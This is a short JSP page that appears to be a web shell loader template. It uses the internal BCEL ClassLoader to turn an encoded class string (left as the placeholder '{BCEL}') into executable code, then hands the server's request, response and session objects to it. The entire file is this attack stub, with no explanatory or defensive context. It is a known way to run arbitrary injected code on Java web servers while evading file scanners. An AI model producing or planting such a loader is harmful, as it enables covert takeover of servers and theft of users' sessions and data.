<%@ page import="com.sun.org.apache.bcel.internal.util.ClassLoader" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.util.HashMap" %><%
    String bcelCode = "{BCEL}";
    ClassLoader loader =new ClassLoader();
    Class<?> clazz = loader.loadClass(bcelCode);
    HashMap map = new HashMap();
    map.put("request",request);
    map.put("response",response);
    map.put("session",session);
    Constructor constructor = clazz.getConstructor(HashMap.class);
    constructor.newInstance(map);
%>